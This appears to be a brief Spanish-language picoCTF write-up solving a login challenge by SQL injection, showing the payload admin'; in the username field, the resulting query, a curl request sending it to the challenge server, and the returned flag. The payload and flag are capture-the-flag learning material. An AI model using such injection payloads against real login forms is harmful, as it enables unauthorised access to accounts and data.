# Objetivo

# Solución
```
username: admin';
password: 
SQL query: SELECT * FROM users WHERE name='admin';' AND password=''

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_c34df170}


------------------------
┌──(kalicura㉿rufian)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin';"  
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>                                                                                            
```
# Notas
- Al usar el usuario ==admin';== forzamos la inyección SQL, la cual verifica que exista un usuario llamado admin, al este existir, la consulta es verdadera y nos da la flag
# Referencia